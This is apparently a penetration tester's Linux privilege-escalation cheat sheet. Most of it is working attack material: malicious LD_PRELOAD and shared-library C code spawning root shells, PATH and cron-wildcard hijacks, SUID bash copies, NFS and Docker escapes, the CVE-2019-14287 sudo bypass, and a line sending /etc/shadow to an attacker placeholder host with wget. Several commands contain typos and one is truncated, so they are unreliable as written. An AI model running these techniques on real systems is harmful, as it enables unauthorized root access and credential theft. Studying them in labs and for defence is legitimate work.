# Linux

## Manual Enumeration

### System

```bash
hostname
uname -a
cat  /proc/version
cat /etc/issue
lscpu
ps aux
cat /etc/crontab
crontab -e  # check for a specific user
crontab -l
cat /var/log/syslog | grep root
find / -type f -perm -4000 2>/dev/null, find / -perm -u=s -type f 2>/dev/null  # SUID
find / -type f -perm -2000 2>/dev/null  # GUID
getcap -r / 2>/dev/null
ls -l /etc/sudoers  # Check if we can write to the file
find / -group cmeeks -ls 2>/dev/null | grep -v "home\|tmp\|proc"
```

### User

```bash
whoami
id
sudo -l
cat /etc/passwd
cat /etc/shadow
ls -l /etc/passwd
ls -l /etc/shadow
cat /etc/group
history
```

### Network

```bash
ifconfig / ip a s
route
arp -a / ip neigh
netstat -ano / ss -an | grep LISTEN
```

### Password Hunting

```bash
grep --color=auto -rnw '/' -ie "PASSW" --color=always 2> /dev/null
locate password | more
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

## Automated Enumeration

### Scripts

* LinPEAS
* LinEnum
* linux-exploit-suggester
* Linuxprivchecker.py
* linux-smart-enumeration (lse)
* pspy

## Escalation Path Techniques

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

### Sudo

```bash
# Quick attempt at root shell
sudo su
# If su not found, others can be tried
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
# Identify what can be run using sudo
sudo -l
# Shell Escaping - ex: vim
sudo vim -c ':!/bin/sh'  # via gtfobins
# Intended functionality - ex: apache2, wget
sudo apache2 -f /etc/shadow  # can't edit, but can view system files
sudo wget --post-file=/etc/shadow <kali-ip>:<port>  # Using netcat to collect
```

#### LD\_PRELOAD

After running `sudo -l` if `env_keep+=LD_PRELOAD` a malicious script can be created and run

{% code title="shell.c" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
{% endcode %}

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/path/to/shell.so apache2
```

#### LD\_LIBRARY\_PATH

After running `sudo -l` if `env_keep+=LD_LIBRARY_PATH` a malicious script can be created and run

{% code title="library_path.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
{% endcode %}

```bash
ldd /usr/bin/apache2
# From the output choose a shared object to replace i.e. libcrypt.so.1
# Compile the malicious script above to the name of the shared object to replace
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
# Execute
sudo LD_LIBRARY_PATH=. apache2
```

#### CVE-2019-14287

```bash
sudo -l
# If response has (ALL, !root) /bin/bash
# This means that current user can't run /bin/bash as root (!root)

# Exploit
sudo -u#-1 /bin/bash
```

#### CVE-2019-18634

```bash
cat /etc/sudoers
# Look for: Default    env_reset,pwfeedback
sudo su root
# When typing in the password there are asterisks presented (pwfeedback)
sudo -V
# Check the current version against the CVE details

# Multiple exploits can be found online
```

### SUID / SGID

```bash
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
# Search for both SUID and SGID files
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

#### Shared Object Injection

```bash
# Use strace on a library found from the find command
strace /usr/local/bin/suid-so 2>&1
# Look for "No such file or directory" in the output
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
# In the output, if there is one that can be wrriten to, it can be exploited
# Create a .c script to compile and override
```

{% code title="libcalc.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
{% endcode %}

```bash
# Compile the file with the below
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
# Execute
/usr/local/bin/suid-so
```

#### Binary Symlinks - NGINX

[https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

```bash
# After running sudo -l, if sudo has SUID bit and NGINX is of vulenrable version
ls -la /var/log/nginx  # If the directory can be written to...
# Exploit
./nginxed-root.sh /var/log/nginx/error.log  # Using script from exploit reference
# Wait for or execute action to force 
# Use SSH to log into the machine again, then execute...
invoke-rc.d nginx rotate >/dev/null 2>&
```

#### Environment Variables

```bash
env  # Show environment variables
find / type -f -perm -04000 -ls 2>/dev/null
# Search on binaries from this output using strings

# Example 1
strings /usr/local/bin/suid-env
# Look for commands that do not use absolute path i.e. service apache2 start
# We can create a malicious file called serivce and update the PATH to find it first
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' >/tmp/service.c
gcc /tmp/service.c -o /tmp/service  # Compile malicious service script
export PATH=/tmp:$PATH  # Put /tmp at the beginning of the PATH
/usr/local/bin/suid-env

# Example 2
strings /usr/local/bin/suid-env2
# Command now does seem to use absolute path i.e. /usr/sbin/service apache2 start
function /usr/sbin/service() { cp/bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

### Capabilities

```bash
getcap -r / 2>/dev/null
# Looking for cap_setuid+ep, specifically the ep
/usr/bin/pyton2.6 = cap_setuid+ep
# Exploit
/usr/bin/pyton2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Weak File Permissions

#### /etc/shadow

```bash
# Verify permissions
ls -la /etc/shadow
# If the file is readable, hash cracking can be attempted
john/hashcat
# If the file is writable, the root user's password hash can be replaced
mkpasswd -m sha-512 newpassword  # Generate new password hash.
# Backup shadow file and replace root user password hash with the new one
```

#### /etc/passwd

```bash
# Verify permissions
ls -la /etc/passwd
# If the file is writable, replace the second field with a hash overriding shadow
openssl passwd "password"  # Generate new passowrd hash.
# If the file can only be appeneded to, create new user with root user ID (0)
newroot:<password-hash>:0:0:root:/root:/bin/bash
```

#### Backups

```bash
# There may be insecure backups of sensitive files
# Common places are the / (root) directory, /tmp, and /var/backups
# Verify root login
grep PermitRootLogin /etc/ssh/sshd_config  # Look for 'PermitRootLogin yes'
```

### Passwords & Keys

#### Stored Passwords

```bash
# Check the user history to see if anything interesting was typed previously
history
cat .bash_history
# VPN findings
cat myvpn.ovpn
cat /etc/openvpn/auth.txt
```

#### SSH Keys

```bash
find / -name authorized_keys 2>/dev/null
# If we can write to an authorized_keys file, we can copy our public key to it
find / -name id_rsa 2>/dev/null
# If an id_rsa file is found, it can be copied that locally and try to use to SSH in
chmod 600 id_rsa
ssh -i id_rsa <user>@<IP>
# Generate new SSH keys
ssh-keygen
```

### Cron Jobs

```bash
# User crontabs
/var/spool/cron
/var/spool/cron/crontabs
# System crontab
cat /etc/crontab
# Systemd timers
systemctl list-timers -all
```

#### Example Crontab

{% code title="crontab" %}
```bash
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

***** root overwrite.sh
***** root /usr/local/bin/compress.sh
```
{% endcode %}

#### Cron Paths

```bash
# Where is the PATH executing first? And can we write to it?
# Is there a script being run without an absolute path?
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# Now wait for the cronjob to execute...
# Exploit
/tmp/bash -p
```

#### Cron Wildcards

```bash
# Where is the PATH executing first?
cat /usr/local/bin/compress.sh
# Script shows using a wildcard i.e. tar czf /tmp/backup.tar.gz *
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
chmod +x runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
# Now wait for the cronjob to execute...
# Exploit
/tmp/bash -p
```

#### Cron File Overwrites

```bash
# Where is the PATH executing first?
# Can we write to the file?
locate overwrite.sh
ls -la /usr/local/bin/overwrite.sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
# Can also echo a reverse shell into the file instead
# Exploit
/tmp/bash -p
```

### NFS

```bash
# From target
cat /etc/exports  # Look for no_root_squash
# From Kali (as root)
showmount -e <IP>
mkdir /tmp/mountme
mount -o rw,vers=2 <IP>:/tmp /tmp/mountme
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c
gcc /tmp/mountme/x.c -o /tmp/mountme/x
chmod +s /tmp/mountme/x
# From target
cd /tmp
./x
```

### Service Exploits

```bash
ps aux | grep "^root"
<program> --version, -v
dpkg -l | grep <program>  # Debian based OS
rpm -qa | grep <program>  # Red Hat based OS
# Search on output for exploits (Google/Searchsploit/GitHub)
```

#### Port Forwarding

```bash
# If a root process is bound to an internal port and exploit cannot run on target
# From Target
netstat -nl
> tcp    0    127.0.0.1:3306  # Example of mysql listening locally
ssh -R <Kali-port>:127.0.0.1:<service-port> <username>@<Kali-machine>
ssh -R 4444:127.0.0.1:3306 kali@<Kali-machine>

# From Kali
netstat -ano | grep LIST  # Verify port forward is listening
mysql -u root -h 127.0.0.1 -P 4444
> select @@hostname
```

### Docker

```bash
# List Docker images
docker images
docker image ls
# Exploit via gtfobins
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  # Replace alpine with actual image
# Another option
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

### Kernel Exploits

[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

[https://github.com/SecWiki/linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)

Should show up in LinEnum or linux-exploit-suggester

```bash
uname -a  # Enumerate kernel version
# Search on output for exploits (Google/Searchsploit/GitHub)
searchploit linux kernel 2.6 debian priv esc
```
